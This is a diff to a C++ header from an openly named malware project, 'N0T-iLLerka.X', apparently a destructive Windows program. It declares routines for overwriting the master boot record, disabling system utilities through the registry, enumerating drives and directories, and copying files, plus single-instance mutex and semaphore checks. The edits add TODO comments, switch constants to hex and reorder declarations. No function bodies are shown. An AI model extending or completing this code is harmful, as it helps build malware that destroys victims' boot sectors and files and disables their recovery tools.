@@ -1,4 +1,5 @@
 #pragma once
+// TODO: Clean this Mess up
 
 // Warning Message: //
 /* #define DISABLE_WARNING */
@@ -31,6 +32,7 @@
 		// If defined: Disables the usage of the Global Mutex
 		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)
 
+// TODO: fix this...
 	// Semaphore utilization: //
 	/* #define DISABLE_SEMAPHORE */
 		// If defined: Disables the usage of the Global Semaphore
@@ -39,6 +41,7 @@
 
 // Debug MessageBox Template //
 /*
+	// TODO: modify this
 	#ifdef DEBUG_MSG
 		MessageBox(NULL, L"", L"", MB_OK |  MB_ICON | MB_SYSTEMMODAL);
 	#endif // DEBUG_MSG
@@ -65,14 +68,14 @@
 // Define Macros //
 #define MALWR_NAME L"N0T-iLLerka.X"
 
-#define MIN_RSLEN 8
-#define MAX_RSLEN 16
+#define MIN_RSLEN 0x8
+#define MAX_RSLEN 0x10
 
 #define MAX_BUFFER_SIZE 0x2000000
 
 #define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
 #define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
-#define MAX_SMPO 256
+#define MAX_SMPO 2
 
 #define REGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
 #define REGISTRY_SUBKEY L"N0TiLLerka"
@@ -98,6 +101,11 @@
 extern const WCHAR szCharSet[];
 extern const size_t cnCharSet;
 
+#ifdef DEBUG_MSG
+extern PWCHAR pszDest;
+extern const size_t cnDest;
+#endif // DEBUG_MSG
+
 // FileSystem Functions //
 BOOL fnCopyFileW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR szMfn[]);
 BOOL fnDriveEnumeratorW(std::vector<std::wstring>& vszDrive);
@@ -107,23 +115,23 @@ BOOL fnDirectoryIteratorW(std::wstring szDir, std::wstring szMask, std::vector<s
 BOOL fnOverwriteMBR(VOID);
 #endif // KILL_MBR
 
-// Synchronization Functions //
-#ifndef DISABLE_MUTEX
-BOOL fnCheckMutexW(LPCWSTR lpName);
-#endif // !DISABLE_MUTEX
-#ifndef DISABLE_SEMAPHORE
-BOOL fnCheckSemaphoreW(LPCWSTR lpName);
-#endif // !DISABLE_SEMAPHORE
-
 // RegEdit Functions //
 BOOL fnCreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
 BOOL fnCheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwEType, BYTE bEValue);
 BOOL fnDisableUtilities(VOID);
 
+// Synchronization Functions //
+#ifndef DISABLE_MUTEX
+BOOL fnCheckMutexW(LPCWSTR lpName);
+#endif // !DISABLE_MUTEX
+#ifndef DISABLE_SEMAPHORE
+HANDLE fnCheckSemaphoreW(LPCWSTR lpName);
+#endif // !DISABLE_SEMAPHORE
+
 // Utilitie Functions //
 INT fnCryptGenRandomNumber(VOID);
 std::wstring fnCryptGenRandomStringW(INT nLen);
-BOOL fnCryptGenRandomBufferW(PWCHAR pszRd, ULONG ulFs);
+VOID fnCryptGenRandomBufferW(PWCHAR pszRd, ULONG ulFs);
 BOOL fnIsUserAdmin(VOID);
 
 // NT Utilitie Functions //
